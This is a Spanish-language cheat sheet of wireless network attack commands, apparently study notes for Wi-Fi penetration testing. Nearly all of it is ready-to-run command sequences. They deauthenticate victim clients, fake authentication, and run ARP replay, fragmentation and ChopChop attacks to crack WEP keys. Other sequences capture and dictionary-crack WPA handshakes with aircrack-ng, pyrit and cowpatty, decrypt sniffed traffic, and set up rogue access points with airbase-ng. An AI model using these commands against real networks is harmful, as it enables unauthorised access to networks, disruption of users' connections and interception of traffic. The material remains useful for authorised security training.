########################################
Configuración inicial y reconocimiento
########################################

sudo apt-get install wireless-tools (si no está instalado iwconfig)
iwconfig // observamos modo y si está asociado a algún AP o no
iw list // listar info de la tarjeta inalámbrica
dmesg | grep [tarjeta wifi] // drivers

iw dev wlan0 scan | grep SSID // Listar APs disponibles en rango
iw dev wlan0 scan | egrep "DS\ Parameter\ set|SSID" // Listar APs con su canal

iwlist wlan0 scanning |grep ESSID / egrep "ESSID|Channel"

iw dev wlan0 interface add wlan0mon type monitor // Poner en modo monitor wlan0
  Después ifconfig wlan0mon up
tcpdump -i wlan0mon -s 65000 -p // Comprobar que está en modo monitor

iwconfig wlan0 mode monitor channel [num canal]
  ifconfig wlan0 up
tcpdump -i wlan0mon (wlan0?) -s 65000 -p // Comprobar que está en modo monitor

iw dev wlan0mon interface del // Borrar la interfaz

iwconfig wlan0 mode managed // Volver a modo anterior

macchanger -s wlan0mon // Muestra nuestra MAC

wireshark NOMBRE-CAPTURA

######################################################
Airmon-ng, Airodump-ng, Aireplay-ng conceptos básicos
######################################################

airmon-ng // Muestra tarjeta inalámbrica
airmon-ng check // Muestra procesos que pueden ser problemáticos
airmon-ng check kill // Termina procesos problemáticos

airmon-ng start wlan0 // Poner en modo monitor la interfaz
airmon-ng stop wlan0mon // Para el modo monitor

airmon-ng start wlan0 [channel] // Modo monitor en ese canal (útil para filtrar solo el canal de la red que queramos)
  Comprobar con iwlist wlan0mon channel
  
airodump-ng wlan0mon // Empezar captura de paquetes
airodump-ng -c [channel] wlan0mon
airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA wlan0mon

aireplay-ng -9 wlan0mon // Injection test
aireplay-n -9 -i wlan1 wlan0mon // Probar inyección en una segunda tarjeta que tengamos

aircrack-ng -0 (con colorines) CAPTURE-FILENAME

#################################################
OPEN SYSTEM AUTHENTICATION, conceptos generales
#################################################

Fake Auth Attack
------------------
aireplay-ng -1 0 (cada cuanto se repite el fakeauth) -e ESSID-AP -a MAC-AP -h NUESTRA-MAC wlan0mon (Puede que haga falta una MAC válida si tienen MAC filtering)

Deauth Attack
---------------
aireplay-ng -0 1 (num packets to send, 0 para infinito) -a MAC-AP -c VICTIM-MAC wlan0mon

ARP Replay (El más fiable)
----------------------------
(Nos asociamos al AP)
aireplay-ng -1 0 -e ESSID-AP -a MAC-AP -h NUESTRA-MAC wlan0mon
(Comenzamos a capturar paquetes ARP para poder reenviar)
aireplay-ng -3 -b MAC-AP -h NUESTRA-MAC wlan0mon
(Para acelerar el proceso y obtener un paquete ARP que poder reenviar, hacemos un deauth)
  aireplay-ng -0 1 (num packets to send, 0 para infinito) -a MAC-AP -c VICTIM-MAC wlan0mon
aircrack-ng -0 (con colorines) CAPTURE-FILENAME

#######################
ATAQUE AP CON CLIENTE
#######################

PTW Attack
------------
airmon-ng start wlan0 [channel]
airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA wlan0mon
(Recomendable hacer un fake auth para tener la MAC asociada y que sea más fiable) ->
  aireplay-ng -1 0 -e ESSID-AP -a MAC-AP -h NUESTRA-MAC wlan0mon
aireplay-ng -2 -b MAC-AP -d FF:FF:FF:FF:FF:FF -t 1 (filtrar que sean paquetes con ToDS) [/ -f 1-m 68 -n 86 (min y max ARP packet size)] wlan0mon
  Cuando encuentra un paquete y le damos a "y" para reenviar, los #Data deberían subir mucho. Si no suben, Ctrl+C y probar con otro. Se puede hacer ping desde otro cliente en la red para forzar un ARP
aircrack-ng -0 -z (usa PTW Attack) -n 64 (num bits de WEP key) CAPTURE-FILENAME

aireplay-ng -2 -r CAPTURA-CON-PAQUETE-VALIDO wlan0mon

#######################
ATAQUE AP SIN CLIENTE
#######################

airmon-ng start wlan0 [channel]
airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA wlan0mon
(Primero hacer un fakeauth para mantener asociada nuestra MAC)
  aireplay-ng -1 60 (para mantener el fakeauth cada 60 seg) -e ESSID-AP -a/-b MAC-AP -h NUESTRA-MAC wlan0mon

Fragmentation Attack
----------------------
(Espera un paquete, y cuando lo recibe comienza el ataque. Hace falta que la MAC usada esté asociada al AP. Hace falta estar razonablemente cerca del AP para que no falte ningún paquete)
aireplay-ng -5 -b MAC-AP -h MAC-NUESTRA wlan0mon
---Si no inyecta, probar con el arp replay---
packetforge-ng -0 (crear un ARP packet) -a MAP-AP -h NUESTRA-MAC -l SOURCE-IP (vale la broadcast¿?) -k BROADCAST-IP (o cualquier IP no asignada) -y .XOR-FILE -w DEST-FILENAME
OPCIONAL tcpdump -n -vvv -e -s0 -r DEST-FILENAME-ANTERIOR
aireplay-ng -2 (PTW Attack) -r DEST-FILENAME-ANTERIOR wlan0mon

aircrack-ng -0 CAPTURE-FILENAME

ChopChop Attack
-----------------
aireplay-ng -4 -b MAC-AP -h NUESTRA-MAC wlan0mon
  OPCIONAL tcpdump -s 0 -n -e -r ARCHIVO-OBTENIDO-.CAP
packetforge-ng -0 -a MAC-AP -h NUESTRA-MAC -l SOURCE-IP (Obtenida con tcpdump en paso anterior) -k BROADCAST-IP -y .XOR-FILE -w DEST-FILENAME
aireplay-ng -2 -r DEST-FILENAME-ANTERIOR wlan0mon

aircrack-ng -0 CAPTURE-FILENAME

###########################
SHARED KEY AUTHENTICATION
###########################

Iniciar captura, desautenticar cliente para ver la autenticación, desautenticar para obtener keystream y .xor, fakeauth con el .xor, arp replay, y desautenticar cliente para obtener arp para inyectar, y crackear .cap

airmon-ng start wlan0 [channel]
airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA wlan0mon

Deauth con SKA
aireplay-ng -0 1 -a MAC-AP -c MAC-VICTIM wlan0mon (Para que muestre si es SKA)
  Nos creará un .xor

Fake Authentication con SKA
aireplay-ng -1 60 -e ESSID-AP -y .xor-FILE -a AP-MAC -h NUESTRA-MAC wlan0mon

ARP Request Replay Attack
---------------------------
aireplay-ng -3 -b MAC-AP -h NUESTRA-MAC wlan0mon
(Hacemos un deauth para obtener un paquete ARP)
aireplay-ng -0 1 -a MAC-AP -c MAC-VICTIM wlan0mon

aircrack-ng -0 -z (usa PTW attack) -n 64 NOMBRE-CAPTURA

####################
WPA PRE SHARED KEY
####################

Iniciar captura, desautenticar un cliente hasta obtener handshake, y crackear handshake

airmon-ng start wlan0 [channel]
airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA wlan0mon
Capturamos el handshake =>
aireplay-ng -0 1 -a MAC-AP -c MAC-VICTIM wlan0mon
(El paquete 1 y el 3 del 4way handshake tienen que tener el mismo nonce (mirar en wireshark))
aircrack-ng -0 -w DICC[/root/psk-crack-dictionary] NOMBRE-CAPTURA

#############
####EXTRA####
#############

airolib-ng NOMBRE-DB-A-CREAR --import essid NOMBRE-ARCHIVO-CON-ESSID-TARGET
airolib-ng NOMBRE-DB-ANTERIOR --stats
airolib-ng NOMBRE-DB-ANTERIOR --import passwd DICC (Ignora las passwords que no sean válidas para wpa)
airolib-ng NOMBRE-DB-ANTERIOR --batch
airolib-ng NOMBRE-DB-ANTERIOR --stats (Vemos que ya hay contraseñas)
aircrack-ng -r NOMBRE-DB-ANTERIOR NOMBRE-CAPTURA

john --wordlist=DICC --rules (usa las reglas por defecto) --stdout
nano john.conf (en el directorio de john)
$[0-9]$[0-9] (Añade dos números al final)
$[0-9]$[0-9]$[0-9] (Añade tres números al final)
john --wordlist=/pentest/wireless/aircrack-ng/test/paswsword.lst --rules --stdout | aircrack-ng -0 -e ESSID -w - NOMBRE-CAPTURA

cowpatty -r NOMBRE-CAPTURA -f DICC -2 (?) -s ESSID (Más lento que aircrack-ng)

Crear rainbow table (hay que crearla para cada ESSID)
genpmk -f DICC -d ARCHIVO-SALIDA -s ESSID
cowpatty -r NOMBRE-CAPTURA -d HASHES-FILE -2 -s ESSID 

Comprobar si tenemos un handshake
pyrit -r NOMBRE-CAPTURA analyze
Dejar solo los paquetes necesarios para crackear
pyrit -r NOMBRE-CAPTURA -o OUTPUT-FILENAME strip
Ataque bruteforce
pyrit -r NOMBRE-CAPTURA -i DICC -b MAC-AP attack_passthrough

Ataque con bbdd
pyrit eval
pyrit -i (import) DICC import_passwords
(Solo guarda las pass válidas para WPA)
pyrit eval
pyrit -e ESSID create_essid
pyrit eval
pyrit batch
pyrit -r NOMBRE-CAPTURA attack_db

(Ver GPUs disponibles)
pyrit list_cores
pyrit benchmark (password test)

wc -l DICC (Líneas del archivo)

Airdecap-ng (Decodear tráfico sniffeado)
airdecap-ng -b MAC-AP NOMBRE-CAPTURA (Crea un archivo -dec.cap solo con el tráfico interesante para abrirlo con Wireshark)
airdecap-ng -w WEP-KEY NOMBRE-CAPTURA (Crea un archivo en claro del tráfico)
airdecap-ng -e ESSID -p WPA-PASS NOMBRE-CAPTURA

Airserv-ng (sniffear desde otra IP en vez de desde nuestra interfaz)
airmon-ng start wlan0 [channel]
airserv-ng -p [port] -c [channel] -d wlan0mon
airodump-ng -c [channel] -bssid MAC-AP IP-ANTERIOR:puerto

Airtun-ng (decrypt traffic in real time, IDS por ejemplo)
airmon-ng start wlan0 [channel]
airtun-ng -a MAC-AP -w WEP-KEY wlan0mon
ifconfig at0 (o la que cree) up
wireshark (en at0)

Airgraph-ng
airgraph-ng -i CSV-FILE -g CAPR -o OUTPUT-FILE.png
eog OUTPUT-ANTERIOR.png
airgraph-ng -i CSV-FILE -g CPG -o OUTPUT-FILE.png
eog OUTPUT-ANTERIOR.png

Kismet
El .nettxt tiene logs
wireshark el .pcapdump

GISKismet
giskismet -x netxml-file
giskismet -q "select * from wireless" -o OUTPUT.kml
Abrir con google-earth o similar
giskismet -q "select * from wireless where Encryption='WEP'" -o OUTPUT.kml
Abrir con google-earth o similar

Airbase-ng
airmon-ng start wlan0 [channel]
airbase-ng -c [channel] -e "ESSID-DESEADO" wlan0mon

Capturar tráfico en nuestro fake AP y obtener hanshake de una WPA
airodump-ng -c [channel] -d MAC-NUESTRA -w NOMBRE-CAPTURA wlan0mon
airbase-ng -c [channel] -e "ESSID-DESEADO" -z 4 (WPA2 CCMP Cipher) -W 1 (specify beacons to use WEP encryption) wlan0mon
aircrack-ng -0 -w DICC[/pentest/passwords/john/password.lst] NOMBRE-CAPTURA
